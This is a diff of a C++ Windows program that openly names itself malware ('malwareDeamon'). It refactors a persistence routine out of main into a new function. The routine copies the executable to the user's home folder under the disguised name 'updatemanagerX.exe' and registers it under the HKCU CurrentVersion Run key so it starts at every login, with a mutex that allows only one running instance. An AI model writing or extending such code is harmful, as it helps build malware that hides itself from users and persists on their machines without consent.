@@ -92,6 +92,7 @@ void malwareDeamon(std::string w) {
 }
 
 char* abso(const char* x, size_t* sp = nullptr);
+void cn(char* argv, const char* agv[], std::string home, bool& Persist);
 
 int main(int argc, char* argv[])
 {
@@ -112,10 +113,43 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	std::future<int> fut = std::async(om, argc, argv);
+	cn(argv[0], agv, home, Persist);
+	return fut.get();
+}
+
+bool shouldClose() {
+	//Make sure at most one instance of the tool is running
+	HANDLE hMutexOneInstance(::CreateMutexA(NULL, TRUE, appguid));
+	bool bAlreadyRunning((::GetLastError() == ERROR_ALREADY_EXISTS));
+	if (hMutexOneInstance == NULL || bAlreadyRunning)
 	{
-		std::string a(argv[0]);
+		if (hMutexOneInstance)
+		{
+			::ReleaseMutex(hMutexOneInstance);
+			::CloseHandle(hMutexOneInstance);
+		}
+		return true;
+	}
+	return false;
+}
+
+char* abso(const char* x, size_t* sp) {
+	std::string m = std::filesystem::absolute(x).string();
+	size_t s2 = (1 + m.size()) * sizeof(char);
+	char* tld2 = (char*)malloc(s2);
+	if (tld2 == nullptr) return nullptr;
+	strcpy_s(tld2, s2, m.c_str());
+	if (sp != nullptr)
+		*sp = s2;
+	return tld2;
+}
+
+void cn(char* argv, const char* agv[], std::string home, bool& Persist) {
+	bool r = false;
+	{
+		std::string a(argv);
 		bool cp = false;
-		if(Persist) {
+		if (Persist) {
 			std::string nf = home + "updatemanagerX.exe";
 			if (!std::filesystem::exists(nf)) {
 				char* tld2 = abso(a.c_str());
@@ -135,7 +169,7 @@ int main(int argc, char* argv[])
 		if (tld == nullptr) goto skiphephistus;
 		strcpy_s(tld, s, codec.c_str());
 
-		if (cp&&Persist) {
+		if (cp && Persist) {
 			HKEY k;
 			LSTATUS x = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_WRITE, &k);
 			if (x == ERROR_SUCCESS) {
@@ -171,34 +205,8 @@ int main(int argc, char* argv[])
 
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
-	}
-skiphephistus:
-	return fut.get();
-}
 
-bool shouldClose() {
-	//Make sure at most one instance of the tool is running
-	HANDLE hMutexOneInstance(::CreateMutexA(NULL, TRUE, appguid));
-	bool bAlreadyRunning((::GetLastError() == ERROR_ALREADY_EXISTS));
-	if (hMutexOneInstance == NULL || bAlreadyRunning)
-	{
-		if (hMutexOneInstance)
-		{
-			::ReleaseMutex(hMutexOneInstance);
-			::CloseHandle(hMutexOneInstance);
-		}
-		return true;
+	skiphephistus:
+		__nop();
 	}
-	return false;
-}
-
-char* abso(const char* x, size_t* sp) {
-	std::string m = std::filesystem::absolute(x).string();
-	size_t s2 = (1 + m.size()) * sizeof(char);
-	char* tld2 = (char*)malloc(s2);
-	if (tld2 == nullptr) return nullptr;
-	strcpy_s(tld2, s2, m.c_str());
-	if (sp != nullptr)
-		*sp = s2;
-	return tld2;
 }
